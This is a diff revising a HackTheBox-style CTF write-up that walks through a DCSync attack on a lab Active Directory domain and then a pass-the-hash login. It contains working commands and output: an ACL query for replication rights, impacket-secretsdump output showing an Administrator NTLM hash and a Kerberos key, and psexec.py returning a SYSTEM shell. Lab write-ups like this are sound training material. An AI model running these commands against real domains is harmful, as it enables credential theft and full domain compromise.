@@ -246,6 +246,8 @@ Many Active Directory (AD) infrastructure has multiple Domain Controllers. To ma
 
 In a DCSync attack, we impersonate a Domain Controller to replicate objects.
 
+### Required Permissions
+
 However, to perform a DCSync attack, the compromised account needs to have the following replication permissions:
 
 The “DS-Replication-Get-Changes” extended right
@@ -262,13 +264,18 @@ The “Replicating Directory Changes In Filtered Set” extended right (not alwa
 
 ### Checking Active Directory Permissions
 
-We have compromised two accounts: fsmith and svc_loanmgr. Let's check if any of them has the required permissions for a DCSync attack.
+We have compromised two accounts:
+
+* fsmith
+* svc_loanmgr.
+
+Let's check if any of them has the required permissions for a DCSync attack.
 
 We need the ActiveDirectory module for the following command.
 
 `Import-Module ActiveDirectory`
 
-The part before the `|` gets specific access permissions of objects in the stated domain. The part after filters the output to show only the permissions that we are interested in. (i.e. the permissions that enable a DCsync attack.)
+In the command below, the part before `|` gets specific access permissions of objects in the stated domain. It returns many results, so the part after `|` filters the output to show only the permissions that we are interested in. (i.e. the permissions that enable a DCsync attack.)
 
 `(Get-ACL "AD:dc=EGOTISTICAL-BANK,dc=LOCAL").access | Where-Object {($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" )}`
 
@@ -301,11 +308,12 @@ PropagationFlags      : None
 
 ### Dumping Secrets
 
-Impacketo
+We can perform a DCsync attack remotely with Impacket's secretsdump.py.
 
-`impacket-secretsdump -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175`
+`impacket-secretsdump -just-dc EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175`
 
 ```
+root@kali:~/htb/openadmin# impacket-secretsdump -just-dc EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
 Password:
@@ -313,16 +321,38 @@ Password:
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
 <SNIP>
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
+<SNIP>
 [*] Cleaning up...
 ```
 
+Now that we have the hashes, we can use them to get admin access.
+
 ### Passing The Hash
 
-Impacket-psexec get cmd
+The SMB port is open so psexec is an option.
 
 `./psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff`
 
-you need admin share - https://adamtheautomator.com/psexec-ultimate-guide/ - write access?
+```
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.175.....
+[*] Found writable share ADMIN$
+[*] Uploading file lITmZIjg.exe
+[*] Opening SVCManager on 10.10.10.175.....
+[*] Creating service JnaQ on 10.10.10.175.....
+[*] Starting service JnaQ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.973]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+We are passing the NTLM hashes here. You can also use the Kerberos key. But there more details to pay attention to when you authenticate with Kerberos including time sync and using a FQDN.
 
 # Ending Thoughts
 
@@ -331,9 +361,12 @@ This was my first Active Directory box. It spurred me to learn a lot more about 
 *References*
 
 staffname format
+
 ad Permissions
+
 dcsync with impacket
-PTH
+
+add to pentesting notes
 
 Kerberos and AS-REP Roasting
 
@@ -344,3 +377,5 @@ Kerberos and AS-REP Roasting
 
 evil-winrm
 https://hacks.biz/evilwinrm-the-ultimate-winrm-shell-for-pentesting/
+
+https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/
